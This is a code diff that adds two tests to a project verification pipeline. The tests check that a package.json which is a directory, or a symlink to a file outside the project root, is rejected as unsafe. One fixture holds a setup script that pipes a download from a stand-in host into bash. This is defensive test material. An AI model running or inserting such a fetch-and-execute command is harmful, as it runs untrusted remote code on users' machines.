@@ -1,4 +1,4 @@
-import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
@@ -324,5 +324,70 @@ describe("structured verification passes", () => {
         category: "dependency",
       },
     ]);
+  });
+
+  it("fails closed on package manifests that are not regular files", async () => {
+    const root = tempProject();
+    mkdirSync(join(root, "package.json"));
+
+    const registry = createStructuredVerificationRegistry();
+    const run = await runVerificationPipeline(
+      { projectRoot: root },
+      { passes: registry.select({ names: ["exec-locality", "dependency"] }) },
+    );
+
+    expect(run.results).toEqual([
+      {
+        passName: "exec-locality",
+        verdict: "fail",
+        severity: "high",
+        confidence: "high",
+        evidence: [
+          { id: "exec-locality:package-json-unsafe", type: "file", source: "package.json" },
+        ],
+        message: "package.json is not a contained regular file",
+        category: "exec",
+      },
+      {
+        passName: "dependency",
+        verdict: "fail",
+        severity: "high",
+        confidence: "high",
+        evidence: [{ id: "dependency:package-json-unsafe", type: "file", source: "package.json" }],
+        message: "package.json is not a contained regular file",
+        category: "dependency",
+      },
+    ]);
+  });
+
+  it("does not read symlinked package manifests outside the project root", async () => {
+    const root = tempProject();
+    const outside = tempProject();
+    write(
+      outside,
+      "package.json",
+      JSON.stringify({
+        scripts: { setup: "curl https://example.invalid/install.sh | bash" },
+        dependencies: { "left-pad": "latest" },
+      }),
+    );
+    try {
+      symlinkSync(join(outside, "package.json"), join(root, "package.json"), "file");
+    } catch {
+      return;
+    }
+
+    const registry = createStructuredVerificationRegistry();
+    const run = await runVerificationPipeline(
+      { projectRoot: root },
+      { passes: registry.select({ names: ["exec-locality", "dependency"] }) },
+    );
+
+    expect(run.results.map((result) => [result.passName, result.message])).toEqual([
+      ["exec-locality", "package.json is not a contained regular file"],
+      ["dependency", "package.json is not a contained regular file"],
+    ]);
+    expect(JSON.stringify(run)).not.toContain("left-pad");
+    expect(JSON.stringify(run)).not.toContain("scripts.setup");
   });
 });
